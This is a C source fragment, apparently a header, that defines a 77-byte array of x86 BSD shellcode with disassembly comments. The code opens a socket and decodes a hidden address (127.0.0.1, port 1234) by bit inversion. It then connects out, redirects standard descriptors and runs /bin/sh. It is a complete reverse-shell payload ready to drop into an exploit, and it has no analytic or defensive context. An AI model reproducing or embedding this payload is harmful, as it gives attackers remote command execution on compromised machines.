
#define RS_SIZE 77

char RS[] = {
  /* 0000 */ "\xb8\x80\xff\xff\xfe" /* mov eax, 0xfeffff80 */
  /* 0005 */ "\xba\xff\xfd\xfb\x2d" /* mov edx, 0x2dfbfdff */
  /* 000A */ "\xf7\xd0"             /* not eax             */
  /* 000C */ "\xf7\xd2"             /* not edx             */
  /* 000E */ "\x50"                 /* push eax            */
  /* 000F */ "\x52"                 /* push edx            */
  /* 0010 */ "\x89\xe7"             /* mov edi, esp        */
  /* 0012 */ "\x6a\x61"             /* push 0x61           */
  /* 0014 */ "\x58"                 /* pop eax             */
  /* 0015 */ "\x99"                 /* cdq                 */
  /* 0016 */ "\x52"                 /* push edx            */
  /* 0017 */ "\x42"                 /* inc edx             */
  /* 0018 */ "\x52"                 /* push edx            */
  /* 0019 */ "\x42"                 /* inc edx             */
  /* 001A */ "\x52"                 /* push edx            */
  /* 001B */ "\x52"                 /* push edx            */
  /* 001C */ "\xcd\x80"             /* int 0x80            */
  /* 001E */ "\x93"                 /* xchg ebx, eax       */
  /* 001F */ "\x53"                 /* push ebx            */
  /* 0020 */ "\x6a\x10"             /* push 0x10           */
  /* 0022 */ "\x6a\x5a"             /* push 0x5a           */
  /* 0024 */ "\x58"                 /* pop eax             */
  /* 0025 */ "\xcd\x80"             /* int 0x80            */
  /* 0027 */ "\xff\x4c\x24\x08"     /* dec dword [esp+0x8] */
  /* 002B */ "\x79\xf5"             /* jns 0x22            */
  /* 002D */ "\x57"                 /* push edi            */
  /* 002E */ "\x53"                 /* push ebx            */
  /* 002F */ "\x50"                 /* push eax            */
  /* 0030 */ "\xb0\x62"             /* mov al, 0x62        */
  /* 0032 */ "\xcd\x80"             /* int 0x80            */
  /* 0034 */ "\x50"                 /* push eax            */
  /* 0035 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f     */
  /* 003A */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f     */
  /* 003F */ "\x89\xe3"             /* mov ebx, esp        */
  /* 0041 */ "\x50"                 /* push eax            */
  /* 0042 */ "\x53"                 /* push ebx            */
  /* 0043 */ "\x89\xe1"             /* mov ecx, esp        */
  /* 0045 */ "\x50"                 /* push eax            */
  /* 0046 */ "\x51"                 /* push ecx            */
  /* 0047 */ "\x53"                 /* push ebx            */
  /* 0048 */ "\x50"                 /* push eax            */
  /* 0049 */ "\xb0\x3b"             /* mov al, 0x3b        */
  /* 004B */ "\xcd\x80"             /* int 0x80            */
};